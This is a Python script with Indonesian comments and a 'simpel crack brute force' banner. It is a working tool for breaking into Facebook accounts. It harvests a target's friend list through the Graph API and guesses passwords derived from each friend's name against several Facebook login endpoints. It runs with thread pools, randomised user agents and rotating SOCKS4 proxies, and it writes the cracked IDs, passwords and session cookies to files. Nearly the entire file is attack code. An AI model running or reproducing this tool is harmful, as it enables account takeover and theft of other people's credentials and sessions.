###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,platform
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
usragent = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]

###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	baz_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT ]----------###
for agenku in range(10000):
	a='Mozilla/5.0 (Linux; Android 8.0.0; VS995'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='Build/OPR1.170623.032; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko)'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/233.0.0.36.117;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android 10; LM-Q630'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='Build/QKQ1.200730.002; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko)'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)

###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'

###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

###----------[ UNTUK ANIMASI ]----------###
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def baz_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
        
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	baz_bann(f'''{mer}   _____ __________  ______
{mer}  / ___// ____/ __ )/ ____/
{mer}  \__ \/ /   / __  / /_    
{puti} ___/ / /___/ /_/ / __/    
{puti}/____/\____/_____/_/
simpel crack brute force''')

###----------[ NGECEK COOKIES ]----------###
def login_baz():
	try:
		token = open('.tokenakun.txt','r').read()
		cok = open('.cookiesakun.txt','r').read()
		tokenefb.append(token)
		try:
			gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenefb[0], cookies={'cookie':cok})
			nteng = json.loads(gerap.text)['id']
			menu(nteng)
		except KeyError:
			login_men()
		except requests.exceptions.ConnectionError:
			baz_anim(f'{mer}koneksimu bermasalah ster :(')
			exit()
	except IOError:
		login_men()
		
###----------[ LOGIN COOKIESNYA ]----------###
def login_men():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		print('???????????????????????????????????????????????????????????????????????????????????????')
		cookie=input(f'cookies :{xxx}{hijo} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		ken = open(".tokenakun.txt", "w").write(tok)
		cok = open(".cookiesakun.txt", "w").write(cookie)
		baz_anim(f'{puti}?????????{bira} login berhasil ster jalanin ulang scnya')
		exit()
	except Exception as e:
		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
		baz_anim(f'{puti}?????????{kun} login gagal ster coba ganti tumbal')
		exit()

###----------[ BAGIAN MENU ]----------###
def menu(id):
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		baz_anim(f'{mer}cookies telah kadaluarsa ster')
		waktu(4)
		login_men()
	os.system('clear')
	banner()
	print(f'{xxx}???????????????????????????????????????????????????????????????????????????????????????')
	print(f'{xxx}????????? ketik ya untuk mulai crack')
	helpbas = input(f'{xxx}????????? : ')
	if helpbas in ['ya','y']:
		nge_krek()
	else:
		baz_anim(f'{mer}????????? yang bener lah ster')

###----------[ DUMP ID PUBLIK ]----------###
def nge_krek():
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		baz_anim(f'{mer}cookies telah kadaluarsa ster')
		exit()
	print(f'{xxx}???????????????????????????????????????????????????????????????????????????????????????')
	idnyanih = input(f'????????? id : ')
	try:
		ambilid = requests.get('https://graph.facebook.com/v1.0/'+idnyanih+'?fields=friends.limit(5001)&access_token='+tokenefb[0],cookies={'cookie': cok}).json()
		for proses in ambilid['friends']['data']:
			try:id.append(proses['id']+'|'+proses['name'])
			except:continue
		print(f'????????? terkumpul : '+str(len(id)))
		atur_dulu()
	except requests.exceptions.ConnectionError:
		baz_anim(f'{mer}????????? koneksi terputus')
		exit()
	except (KeyError,IOError):
		baz_anim(f'{mer}????????? teman tidak publik')
		exit()

###----------[  ATUR DULU STER ]----------###
def atur_dulu():
	print(f'{xxx}???????????????????????????????????????????????????????????????????????????????????????')
	print('????????? 1. akun baru')
	print('????????? 2. akun acak')
	aturid = input(f'{xxx}????????? : ')
	if aturid in ['1','01']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['2','02']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		baz_anim(f'{mer}????????? yang bener lah ster')
		exit()
		
	print(f'{xxx}???????????????????????????????????????????????????????????????????????????????????????')
	print('????????? 1. mobile')
	print('????????? 2. free')
	print('????????? 3. mbasic')
	metod = input(f'{xxx}????????? : ')
	if metod in ['1','01']:
		baz.append('mobile')
	elif metod in ['2','02']:
		baz.append('free')
	elif metod in ['3','03']:
		baz.append('mbasic')
	else:
		baz.append('mobile')
	passwrd()
		
###----------[  BAGIAN WORDLIST ]----------###
def passwrd():
	global prog,des
	print(f'{xxx}???????????????????????????????????????????????????????????????????????????????????????')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12')
						pwv.append(frs+'1')
						pwv.append(frs+'786')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12')
						pwv.append(frs+'1')
						pwv.append(frs+'786')
						pwv.append(frs+'12345')
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'mobile' in baz:
					gas_krek.submit(crackmobile,idf,pwv)
				elif 'free' in baz:
					gas_krek.submit(crackfree,idf,pwv)
				elif 'mbasic' in baz:
					gas_krek.submit(crackmbasic,idf,pwv)
				else:
					gas_krek.submit(crackmbasic,idf,pwv)
		print(f'{xxx}???????????????????????????????????????????????????????????????????????????????????????')
		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
		print(f'{xxx}???????????????????????????????????????????????????????????????????????????????????????')
		
###----------[  MOBILE ]----------###
def crackmobile(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'d.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://d.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'d.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r????????? {kun}{idf}|{pw}\n{xxx}????????? {mer}{ua}{xxx}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r????????? {hijo}{idf}|{pw}\n{xxx}????????? {hijo}{kuki}{xxx}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1

###----------[  FREE ]----------###
def crackfree(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2076461462396807&kid_directed_site=0&app_id=2076461462396807&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D2076461462396807%26redirect_uri%3Dhttps%253A%252F%252Fduniagames.co.id%252Fnew-callback%26scope%3Dpublic_profile%252Cemail%26code_challenge%3DYqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo%26code_challenge_method%3DS256%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd614149f-136e-431f-babf-db7f365bce91%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fduniagames.co.id%2Fnew-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r????????? {kun}{idf}|{pw}\n{xxx}????????? {mer}{ua}{xxx}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r????????? {hijo}{idf}|{pw}\n{xxx}????????? {hijo}{kuki}{xxx}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1

###----------[  MBASIC ]----------###
def crackmbasic(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ij5am11iil6hz1wvbxly1aw5nr1xdaxdnuhpedw1sskkp21k5mi75%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc3210f68-dec3-4e45-b2dd-3343c162aa15%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ij5am11iil6hz1wvbxly1aw5nr1xdaxdnuhpedw1sskkp21k5mi75%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://mbasic.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&state=%7B%22fbLoginKey%22%3A%221ij5am11iil6hz1wvbxly1aw5nr1xdaxdnuhpedw1sskkp21k5mi75%22%2C%22fbLoginReturnURL%22%3A%22%2F%22%7D&scope=email&response_type=code%2Cgranted_scopes&locale=id_ID&ret=login&fbapp_pres=0&logger_id=c3210f68-dec3-4e45-b2dd-3343c162aa15&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r????????? {kun}{idf}|{pw}\n{xxx}????????? {mer}{ua}{xxx}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r????????? {hijo}{idf}|{pw}\n{xxx}????????? {hijo}{kuki}{xxx}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login_baz()
